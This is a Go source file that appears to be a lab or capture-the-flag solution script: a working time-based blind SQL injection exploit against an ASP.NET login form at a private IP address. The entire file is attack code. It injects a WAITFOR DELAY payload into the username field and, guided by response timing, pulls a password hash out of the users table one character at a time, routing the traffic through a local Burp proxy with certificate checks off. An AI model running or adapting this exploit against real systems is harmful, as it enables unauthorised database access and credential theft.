package main

//https://www.urlencoder.io/golang/

import (
    "fmt"
    "net/http"
    "net/url"
    "io/ioutil"
    "log"
    "bytes"
    "crypto/tls"
    "time"
    "strings"
)

func main() {
	
    charSet := "01234567890abcdedfghijklmnopqrstABCDEFGHIJKLMNOPQRSTUVWXYZ$.:"
    var extract string
    extractedString := make([]string, 0, 0)
    for {
        for i := 0; i < len(charSet); i++ {
            e := timeBasedExtract(string(charSet[i]), &extract)
            if e != "" {
                extractedString = append(extractedString, e)
                extract = strings.Join(extractedString, "")
                log.Print("Extract: ", extract)
            }
        }
    }
}

func timeBasedExtract(char string, extract *string) (string) {
        //Pass through Burp
        proxyURL, e := url.Parse("http://127.0.0.1:8080") 
        if e != nil {
            panic(e)
        }

        client := &http.Client{
            Transport: &http.Transport{
                Proxy: http.ProxyURL(proxyURL),
                TLSClientConfig: &tls.Config{InsecureSkipVerify:true},
            },
        }
        
        data := url.Values{
            "__VIEWSTATE": []string{"/wEPDwUKLTQ0NDEwMDQ5Mg9kFgJmD2QWAgIDD2QWAgIBD2QWAgIHDw8WAh4EVGV4dAUeSW52YWxpZCB1c2VybmFtZSBvciBwYXNza2V5Li4uZGRkikLoDB+/pXdQqiz9h+j5nHjE4OqEYro7hz/kDYh48fQ="},
            "__VIEWSTATEGENERATOR": []string{"CA0B0334"},
            "__EVENTVALIDATION": []string{"/wEdAAQ5uNqOYHbIeyi7LRhe1+7mG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb69X6Gyh7W5UwTVXhfLT4lC/UYzzbo01YDuyOekjcuLek="},
            "ctl00$ContentPlaceHolder1$UsernameTextBox": []string{"admin';if(select top 1 password_hash from users) like '"+*extract+string(char)+"%' WAITFOR DELAY '0:0:5';-- -"},
            "ctl00$ContentPlaceHolder1$PasswordTextBox": []string{"admin"},
            "ctl00$ContentPlaceHolder1$LoginButton": []string{"Enter"},
        }
        body := []byte(fmt.Sprint(data.Encode()))
        req, err := http.NewRequest(
            "POST",
            "http://192.168.107.63:450",
            bytes.NewReader(body),
        )
        req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0")
        req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")

        if err != nil {
            log.Fatalf("[!] Unable to generate request: %s\n", err)
        }
        req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
        start := time.Now()
        resp, err := client.Do(req)
        if err != nil {
            log.Fatalf("[!] Unable to process response: %s\n", err)
        }
    
        body, err = ioutil.ReadAll(resp.Body)
        if err != nil {
            log.Fatalf("[!] Unable to read response body: %s\n", err)
        }
        resp.Body.Close()
        lapsedSeconds := time.Since(start).Seconds()
        if ((lapsedSeconds > 5) && (lapsedSeconds < 6)) {
            log.Println("Lapsed time: ", lapsedSeconds, "Character: ", string(char))
            return string(char)
        }
        return ""
}